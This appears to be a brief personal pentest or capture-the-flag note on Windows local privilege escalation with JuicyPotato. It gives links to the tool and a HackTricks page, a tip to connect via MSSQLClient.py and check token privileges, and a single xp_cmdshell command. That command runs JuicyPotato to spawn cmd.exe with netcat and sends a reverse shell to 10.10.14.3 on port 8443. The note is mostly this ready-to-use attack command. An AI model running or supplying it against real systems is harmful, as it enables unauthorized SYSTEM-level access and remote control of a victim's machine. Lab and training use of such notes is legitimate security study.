https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
https://github.com/ohpe/juicy-potato

Connect first with [[MSSQLClient.py]]
look for Key privs

### Run JuicyPotato
```shell-session
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
